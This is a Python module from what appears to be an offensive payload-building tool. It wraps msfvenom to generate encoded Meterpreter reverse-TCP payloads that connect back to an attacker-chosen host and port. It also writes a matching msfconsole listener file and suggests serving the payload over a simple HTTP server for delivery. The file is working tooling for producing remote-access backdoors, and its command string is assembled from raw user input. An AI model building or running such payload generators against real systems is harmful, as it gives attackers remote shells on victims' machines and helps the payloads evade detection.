#!/usr/bin/env python3
# core/generator.py

import os
from datetime import datetime
from .executor import CommandExecutor
from .validator import PayloadValidator
from listeners.rc_generator import ListenerGenerator
from utils.colors import Colors
from utils.file_organizer import FileOrganizer
from utils.logger import PayloadLogger

class PayloadGenerator:
    """Core payload generation engine"""
    
    def __init__(self, verbose=False, executor=None):
        """
        Initialize the payload generator
        
        Args:
            verbose (bool): Enable verbose output
            executor (CommandExecutor, optional): External executor instance
        """
        self.verbose = verbose
        # Use provided executor or create a new one
        self.executor = executor if executor else CommandExecutor(verbose)
        self.validator = PayloadValidator()
        self.listener_gen = ListenerGenerator()
        self.file_organizer = FileOrganizer()
        self.logger = PayloadLogger()
        
        # Check msfvenom availability (only if we're not using an external executor)
        if not executor:  # Only check if we're using our own executor
            if not self.executor.check_msfvenom():
                print(Colors.error("msfvenom not found! Please install Metasploit."))
                exit(1)
    
    def generate_payload(self, platform_key, payload_type_key, staged_key, 
                        lhost, lport, format_type, output_name=None, 
                        encoder=None, iterations=5):
        """
        Generate payload with specified parameters
        """
        try:
            # Get platform and payload details
            platform = self.validator.PLATFORMS[platform_key]['name']
            payload_type = self.validator.PAYLOAD_TYPES[payload_type_key]
            
            # Build payload name
            if staged_key == '2':  # Stageless
                payload_name = f"{platform.lower()}/meterpreter_reverse_tcp"
            else:  # Staged
                payload_name = f"{platform.lower()}/meterpreter/{payload_type}"
            
            # Set output filename
            if not output_name:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                output_name = f"payload_{platform.lower()}_{timestamp}.{format_type}"
            
            # Build msfvenom command
            cmd = f"msfvenom -p {payload_name} LHOST={lhost} LPORT={lport}"
            
            # Add encoder if specified
            if encoder:
                cmd += f" -e {encoder} -i {iterations}"
            
            # Add output format and file
            cmd += f" -f {format_type} -o /tmp/{output_name}"
            
            # Display generation info
            print("\n" + "="*50)
            print(Colors.section("PAYLOAD CONFIGURATION"))
            print("="*50)
            print(f"Platform:     {platform}")
            print(f"Payload:      {payload_name}")
            print(f"Connection:   {lhost}:{lport}")
            print(f"Format:       {format_type}")
            if encoder:
                print(f"Encoder:      {encoder} (x{iterations})")
            print("="*50 + "\n")
            
            # Execute command
            self.logger.info(f"Generating payload: {payload_name}")
            success, stdout, stderr = self.executor.execute(cmd)
            
            if success:
                # Read generated file
                with open(f"/tmp/{output_name}", 'rb') as f:
                    payload_data = f.read()
                
                # Save to organized directory
                saved_path = self.file_organizer.save_payload(
                    payload_data, 
                    platform.lower(), 
                    output_name
                )
                
                # Generate listener file
                listener_content = self.listener_gen.generate_listener(
                    platform.lower(),
                    payload_name,
                    lhost,
                    lport
                )
                listener_path = self.file_organizer.save_listener(
                    listener_content,
                    platform.lower(),
                    lport
                )
                
                # Get file information
                file_info = self.file_organizer.get_file_info(saved_path)
                
                # Log success
                self.logger.success(f"Payload generated: {saved_path}")
                
                # Display results
                self._display_results(file_info, listener_path, lhost, lport)
                
                # Cleanup temp file
                os.remove(f"/tmp/{output_name}")
                
                return True, file_info
            else:
                print(Colors.error(f"Generation failed: {stderr}"))
                self.logger.error(f"Generation failed: {stderr}")
                return False, None
                
        except Exception as e:
            print(Colors.error(f"Error: {str(e)}"))
            self.logger.error(f"Exception: {str(e)}")
            return False, None
    
    def _display_results(self, file_info, listener_path, lhost, lport):
        """Display generation results professionally"""
        print("\n" + "="*50)
        print(Colors.success("PAYLOAD GENERATED SUCCESSFULLY"))
        print("="*50)
        print(f"File:     {file_info['path']}")
        print(f"Size:     {file_info['size']} bytes")
        print(f"MD5:      {file_info['md5']}")
        print(f"SHA1:     {file_info['sha1']}")
        print("\nListener File:")
        print(f"Path:     {listener_path}")
        print(f"Run with: msfconsole -q -r {listener_path}")
        print("\nQuick Transfer:")
        print(f"python3 -m http.server 8080  (from payload directory)")
        print("="*50 + "\n")
